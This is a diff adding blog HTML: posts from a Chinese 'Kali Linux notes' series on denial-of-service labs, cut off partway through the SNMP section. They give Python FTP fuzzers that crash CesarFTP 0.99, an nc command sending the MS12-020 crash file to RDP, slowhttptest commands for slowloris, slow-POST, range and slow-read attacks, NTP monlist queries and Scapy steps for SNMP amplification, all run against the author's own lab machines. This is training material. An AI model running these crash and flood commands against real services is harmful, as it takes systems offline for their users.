@@ -240,6 +240,2071 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/" itemprop="url">Kali Linux笔记(八十六)：应用层DoS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T12:52:37+08:00">
+                2020-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.9k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-应用层DoS"><a href="#1-应用层DoS" class="headerlink" title="1. 应用层DoS"></a>1. 应用层DoS</h4><ul>
+<li>应用服务漏洞<ul>
+<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
+<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
+</ul>
+</li>
+<li>缓冲区溢出漏洞<ul>
+<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
+<li>影响：远程代码执行、DoS</li>
+<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
+</ul>
+</li>
+<li>CesarFTP 0.99服务漏洞<ul>
+<li>ftp_fuzz.py  #MKD/RMD（特殊字符：/n）</li>
+</ul>
+</li>
+<li>MS12-020远程桌面协议DoS漏洞</li>
+<li>Slowhttptest（源自google）<ul>
+<li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li>
+<li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li>
+<li>尤其擅长攻击apache、tomcat（几乎百发百中）</li>
+<li>支持代理</li>
+<li>大量应用服务器和安全设备都无法防护慢速攻击</li>
+</ul>
+</li>
+<li>Slowhttptest攻击方法<ul>
+<li>Slowloris、Slow HTTP POST攻击<ul>
+<li>耗尽应用的并发连接池，类似于Http层的Syn flood（非TCP连接数）</li>
+<li>HTTP协议默认在服务器全部被接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li>
+<li>Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n…..</li>
+<li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送</li>
+</ul>
+</li>
+<li>Slow Read attack<ul>
+<li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li>
+<li>不同之处在于请求正常发送，但慢速读取响应数据</li>
+<li>攻击者调整TCP window窗口大小，是服务器慢速返回数据</li>
+</ul>
+</li>
+<li>Apache Range Header attack<ul>
+<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
+<li>耗尽服务器CPU、内存资源</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">-a start</td>
+<td align="center">start value of ranges-specifier for range header test</td>
+</tr>
+<tr>
+<td align="center">-b bytes</td>
+<td align="center">limit of range-specifier for range header test</td>
+</tr>
+<tr>
+<td align="center">-c number of connections</td>
+<td align="center">limited of 65539</td>
+</tr>
+<tr>
+<td align="center">-d proxy host:port</td>
+<td align="center">for directing all traffic through web proxy</td>
+</tr>
+<tr>
+<td align="center">-e proxy host:port</td>
+<td align="center">for directing only probe traffic through web proxy</td>
+</tr>
+<tr>
+<td align="center">-H,B,R or X</td>
+<td align="center">specify to slow down in headers section or in message body,-R enables range test,-X enables slow read test</td>
+</tr>
+<tr>
+<td align="center">-g</td>
+<td align="center">generate statistics in CSV and HTML formats,pattern is slow_xxx.csv/heml,where xxx is the time and date</td>
+</tr>
+<tr>
+<td align="center">-i seconfs</td>
+<td align="center">interval between follow up datai seconds,per connection</td>
+</tr>
+<tr>
+<td align="center">-k pipeline factor</td>
+<td align="center">number of times to repeat the request in the same connection for slow read test if server supports HTTP pipe-lining</td>
+</tr>
+<tr>
+<td align="center">-l seconds</td>
+<td align="center">test duration in seconds</td>
+</tr>
+<tr>
+<td align="center">-n seconds</td>
+<td align="center">interval between read operation from receive buffer</td>
+</tr>
+<tr>
+<td align="center">-o file</td>
+<td align="center">custom output file path and/or name,effective if -g is specified</td>
+</tr>
+<tr>
+<td align="center">-p seconds</td>
+<td align="center">timeout to wait for HTTP response on probe connction,after which serber is considered inaccessible</td>
+</tr>
+<tr>
+<td align="center">-r connections per second</td>
+<td align="center">connection rate</td>
+</tr>
+<tr>
+<td align="center">-s bytes</td>
+<td align="center">value of Content-Length header,if -B specified</td>
+</tr>
+<tr>
+<td align="center">-t verb</td>
+<td align="center">custom verb to use</td>
+</tr>
+<tr>
+<td align="center">-u URL</td>
+<td align="center">target URL,the same formaat you type in browser,eg https:host[:port]</td>
+</tr>
+<tr>
+<td align="center">-v level</td>
+<td align="center">verbosity level of log 0-4</td>
+</tr>
+<tr>
+<td align="center">-w bytes</td>
+<td align="center">start of range the advertised window size would be picked from</td>
+</tr>
+<tr>
+<td align="center">-x bytes</td>
+<td align="center">max length of follow up data</td>
+</tr>
+<tr>
+<td align="center">-y bytes</td>
+<td align="center">end of range the advertised window size would be picked from</td>
+</tr>
+<tr>
+<td align="center">-z bytes</td>
+<td align="center">bytes to read from receive buffer with single read() operation</td>
+</tr>
+</tbody></table>
+<h4 id="2-实验–CesarFTP-0-99服务漏洞"><a href="#2-实验–CesarFTP-0-99服务漏洞" class="headerlink" title="2. 实验–CesarFTP 0.99服务漏洞"></a>2. 实验–CesarFTP 0.99服务漏洞</h4><ul>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>保存从主机下载的CesarFTP，并安装保存，打开运行程序Server（需要通过防火墙）</li>
+<li>双击打开CesarFTP控制端程序进行配置 → 用户/组 → 添加用户 → anonymous</li>
+<li>文件存取权限 → 选取一个文件夹作为主目录</li>
+<li>cmd → <strong><code>🔺命令：netstat -nao</code></strong>查看21端口是否开启</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：./ftp_fuzz.py</code></strong></li>
+<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [载荷] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 A 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">char = sys.argv[3]</span><br><span class="line">i= int(sys.argv[4])</span><br><span class="line">step = int(sys.argv[4])</span><br><span class="line">max= int(sys.argv[5])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (char*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个（ &quot;+ char + &quot;）&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：./ftp_fuzz1.py</code></strong></li>
+<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 5:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">i= int(sys.argv[3])</span><br><span class="line">step = int(sys.argv[3])</span><br><span class="line">max= int(sys.argv[4])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (&quot;\n&quot;*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个换行符&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-实验–MS12-020远程桌面协议DoS漏洞"><a href="#3-实验–MS12-020远程桌面协议DoS漏洞" class="headerlink" title="3. 实验–MS12-020远程桌面协议DoS漏洞"></a>3. 实验–MS12-020远程桌面协议DoS漏洞</h4><ul>
+<li>Window XP SP3<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
+<li>⭐ 2020.2.11开启远程桌面</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
+在Terminal Server键下，你将发现一个名为fDenyTSConnection的REG_DWORD型键值。双击这个键值打开“编辑DWORD值”对话框，把1(禁用远程桌面)改成0(启用远程桌面)</code></pre></blockquote>
+<ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：searchsploit ms12-020</code></strong></li>
+<li><strong><code>🔺命令：cat /usr/share/exploitdb/platforms/windows/doc/18606.txt</code></strong></li>
+<li>下载termdd_1.dat</li>
+<li><strong><code>🔺命令：nc Window XP SP3的IP 3389 &lt; termdd_1.dat</code></strong>（多次运行才可能生效）</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验–Slowhttptest"><a href="#4-实验–Slowhttptest" class="headerlink" title="4. 实验–Slowhttptest"></a>4. 实验–Slowhttptest</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>slowhttptest<ul>
+<li>-c（建立的连接数，最大值为65539）</li>
+<li>-H（slowloris攻击方式）</li>
+<li>-g/-o（输出结果）</li>
+<li>-i（间隔的时间）</li>
+<li>-r（请求速率也即每次建立的连接数）</li>
+<li>-t（请求的方法）</li>
+<li>-u（攻击的URL）</li>
+<li>-p（三秒不回则为宕机）</li>
+<li>-l（攻击时间）</li>
+<li>-B（HTTP POST 攻击模式）</li>
+</ul>
+</li>
+<li>▲ slowloris 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://Metasploit的IP -x 24 -p 3</code></strong> </li>
+</ul>
+</li>
+<li>▲ Apache Range Header attack 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -R -u http://Metasploit的IP -t HEAD -c 1000 -a 10 -b 3000 -r 500</code></strong></li>
+</ul>
+</li>
+<li>▲ HTTP POST 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://Metasploit的IP -x 10 -p 3</code></strong></li>
+</ul>
+</li>
+<li>▲ Slow Read attack 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://Metasploit的IP -p 3</code></strong></li>
+</ul>
+</li>
+<li>浏览器访问Metasploit尝试连接，在根目录下生成my_header_stats.csv/my_header_stats.html文件</li>
+<li>定制连接数：<strong><code>🔺命令：ulimite -n 70000</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="5-另类的拒绝服务"><a href="#5-另类的拒绝服务" class="headerlink" title="5. 另类的拒绝服务"></a>5. 另类的拒绝服务</h4><ul>
+<li>炸邮箱<ul>
+<li>使用垃圾邮件塞满邮箱</li>
+</ul>
+</li>
+<li>无意识的/非故意的拒绝服务攻击<ul>
+<li>数据库服务器宕机恢复后引用队列大量请求洪水涌来</li>
+<li>告警邮件在邮件服务器修改地址后洪水攻击防火墙</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十五)：DoS--NTP放大</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T22:47:15+08:00">
+                2020-02-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  365 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-NTP放大攻击"><a href="#1-NTP放大攻击" class="headerlink" title="1. NTP放大攻击"></a>1. NTP放大攻击</h4><ul>
+<li>网络时间协议<ul>
+<li>Network Time Protocol </li>
+<li>保证网络设备时间同步</li>
+<li>电子设备互相干扰导致时钟差异越来越大</li>
+<li>服务端口UDP 123</li>
+<li>▲ SSL证书的时间戳</li>
+<li>▲ 影响应用正常运行、日志审计不可信</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>NTP服务提monlist（MON_GETLIST）查询功能<ul>
+<li>监控NTP服务器的状态</li>
+</ul>
+</li>
+<li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul>
+<li>每6个IP一个数据包，最多100个数据包（放大约100倍）</li>
+</ul>
+</li>
+<li>放大效果看monlist的地址列表</li>
+</ul>
+</li>
+<li>攻击对策<ul>
+<li>升级到ntpd 4.2.7p26及以上的版本（默认关闭monlist查询）</li>
+<li>收到关闭monlist查询功能</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>Bodhi（被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：sudo apt-get install ntp</code></strong></li>
+<li><strong><code>🔺命令：netstat -pantu | grep 123</code></strong>（查看ntp服务是否开启）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>发现NTP服务：<strong><code>🔺命令：nmap -sU -p123 Bodhi的IP</code></strong></li>
+<li>发现漏洞<ul>
+<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（timeout）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Bodhi（被攻击者）<ul>
+<li><strong><code>🔺命令：vi /etc/ntp.conf</code></strong> <ul>
+<li>#restrict -4 default kod nomodify notrap nopeer noquery </li>
+<li>#restrict -6 default kod nomodify notrap nopeer noquery</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：service ntp stop/start</code></strong></li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（可查询到monlist地址表）</li>
+<li><strong><code>🔺命令：ntpq -c rv Bodhi的IP</code></strong>（查询Bodhi的系统信息）</li>
+<li><strong><code>🔺命令：ntpdc -c sysinfo Bodhi的IP</code></strong>（查询Bodhi的sysinfo）</li>
+<li>▲ 2020.2.10 无法查到monlist地址表，但能查到Bodhi得系统信息</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十四)：DoS--SNMP放大</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T21:19:01+08:00">
+                2020-02-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  660 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-SNMP放大攻击"><a href="#1-SNMP放大攻击" class="headerlink" title="1. SNMP放大攻击"></a>1. SNMP放大攻击</h4><ul>
+<li>简单网络管理协议（▲ 实际中主要运用为网络设备的监视）<ul>
+<li>Simple Network Management Protocol</li>
+<li>服务端口UDP 161/162</li>
+<li>▲ 主动监控 → 被管理设备161端口，被动监控 → 管理设备162端口</li>
+<li>管理站（manager/客户端）、被管理设备（agent/服务端）</li>
+<li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
+<li>每一个节点都有一个对象标识符（OID）来唯一的标识</li>
+<li>IETF定义标准的MIB库/厂家自定义MIB库</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>请求流量小，查询结果返回流量大</li>
+<li>结合伪造源地址实现攻击</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
+<li>Window Server 2003<ul>
+<li>安装SNMP服务器（Win+R → appwiz.cpl → 更改或添加程序 → 管理和监控工具 → 简单网络管理协议SNMP，可能需要光盘）<ul>
+<li>Win+R → services.msc → SNMP Service → 代理 → 服务全选</li>
+<li>Win+R → services.msc → SNMP Service → 安全 → 团体（Community）</li>
+<li>添加 → 团队权限（只读）、团队名称（asd）</li>
+<li>接受来自任何主机的SNMP数据包</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，网卡模式为Bridge方式</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>IP头构造<ul>
+<li>i=IP()</li>
+<li>i.dst=”Window Server 2003的IP地址”</li>
+<li>i.display()</li>
+</ul>
+</li>
+<li>UDP头构造<ul>
+<li>u=udp()</li>
+<li>u.dport=161</li>
+<li>u.sport=161</li>
+<li>u.display()</li>
+</ul>
+</li>
+<li>SNMP头构造<ul>
+<li>s=SNMP()</li>
+<li>s.community=”asd”</li>
+<li>s.display()</li>
+</ul>
+</li>
+<li>SNMP内容构造<ul>
+<li>b=SNMPbulk() </li>
+<li>b.display() </li>
+<li>b.max_repetitions=100（修改此数可增大回包数据大小）</li>
+<li>b.varbindlist=[SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.1’)),SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.19.1.3’))] </li>
+</ul>
+</li>
+<li>拼接数据<ul>
